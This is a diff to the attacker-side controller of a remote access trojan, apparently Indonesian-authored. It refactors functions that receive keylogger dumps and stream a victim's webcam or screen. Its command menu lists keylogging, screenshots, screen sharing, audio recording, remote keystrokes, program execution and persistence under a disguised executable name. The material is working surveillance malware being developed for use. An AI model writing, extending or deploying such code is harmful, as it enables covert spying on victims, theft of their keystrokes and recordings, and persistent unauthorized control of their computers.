@@ -25,15 +25,14 @@ except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
 
-def recv_log():
-    print("Dumping logs:")
+def recv_keylog():
     try:
         _target.settimeout(3)
+        print("Dumping logs:")
         data = _target.recv(1024).decode()
         print(data)
     except socket.timeout:
         print("No dump received, continuing")
-        pass
 
 def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -171,26 +170,32 @@ def konversi_byte_stream():
      bdata = b""
      payload_size = struct.calcsize("Q")
      while True:
-          while(len(bdata)) < payload_size:
-               packet = tg.recv(4*1024)
-               if not packet: break
-               bdata += packet
-
-          packed_msg_size = bdata[:payload_size]
-          bdata = bdata[payload_size:]
-          msg_size = struct.unpack("Q", packed_msg_size)[0]
-          while len(bdata) < msg_size:
-               bdata += tg.recv(4*1024)
-          frame_data = bdata[:msg_size]
-          bdata =  bdata[msg_size:]
-          frame = pickle.loads(frame_data)
-          cv2.startWindowThread()
-          cv2.imshow("streaming", frame)
-          key = cv2.waitKey(1)
-          if key & 0xFF == ord('q'):
-               break 
-     tg.close()
-     cv2.destroyAllWindows()
+        try:
+                while(len(bdata)) < payload_size:
+                   packet = tg.recv(4*1024)
+                   if not packet: break
+                   bdata += packet
+                packed_msg_size = bdata[:payload_size]
+                bdata = bdata[payload_size:]
+                msg_size = struct.unpack("Q", packed_msg_size)[0]
+                while len(bdata) < msg_size:
+                    bdata += tg.recv(4*1024)
+                frame_data = bdata[:msg_size]
+                bdata =  bdata[msg_size:]
+                frame = pickle.loads(frame_data)
+                cv2.startWindowThread()
+                cv2.imshow("streaming", frame)
+                key = cv2.waitKey(1)
+                if key & 0xFF == ord('q'):
+                   break 
+                tg.close()
+                cv2.destroyAllWindows()
+        except struct.error:
+            print("Can't access camera")
+            break
+        except OSError:
+            print("Can't access camera")
+            break
 
 def upload_file(namafile):
      bufsize = 65536
@@ -255,7 +260,7 @@ def shellc():
              print('starting keylogger')
              pass
           elif perintah == 'baca_log':
-              recv_log()
+             recv_keylog()
           elif perintah == 'clear_log':
              pass  
           elif perintah == 'stop_log':
@@ -273,7 +278,7 @@ def shellc():
                    
                       basic command:
                    ================================
-                   -exit/quit >> exit program
+                   -exit/quit >> exit
                    
                    -clear     >> clear terminal
 
@@ -291,9 +296,9 @@ def shellc():
                    ================================
                    -start_log >> start keylogger
 
-                   -baca_log  >> read result from keylogger
+                   -baca_log  >> read keylogger
 
-                   -clear_log >> delete log from keylogger
+                   -clear_log >> delet log from keylogger
 
                    -stop_log  >> stop keylogger
                    ================================
@@ -307,30 +312,30 @@ def shellc():
 
                      screen command:
                    ================================
-                   -screen_shot >> snap screen
+                   -screen_shot >> screen shot
 
                    -screen_share >> screen sharing
                    ================================
 
                      maintain access:
                    ================================ 
-                   -persistence >> menjalankan persistensi
+                   -persistence >> run persistence
                    example:    persistence winsec manager.exe
                    =================================
 
                      mic, keys command:
                    ================================
-                   -rec_audio >> record audio for 20 sec
+                   -rec_audio >> record audio for 20 second
                    
-                   -send_key  >> type keyboard
+                   -send_key  >> type keyboard remotely
                    ================================ 
 
                      execution:
                    ================================
-                   -execute     >> execute program
-                   
-                   -kill        >> kill program
-                   =================================
+                   -execute    >> start program
+
+                   -kill       >> kill program
+                   ================================
                    
                    """)
           elif perintah == 'rec_audio':
@@ -345,9 +350,9 @@ def shellc():
              x += 1
              start_image_server(save_as='webcam'+str(x)+'.jpg') 
           elif perintah[:7] == 'execute':
-              pass  
+             pass  
           elif perintah[:4] == 'kill':
-              pass  
+             pass  
           else:
              hasil = data_diterima()
              print(hasil)
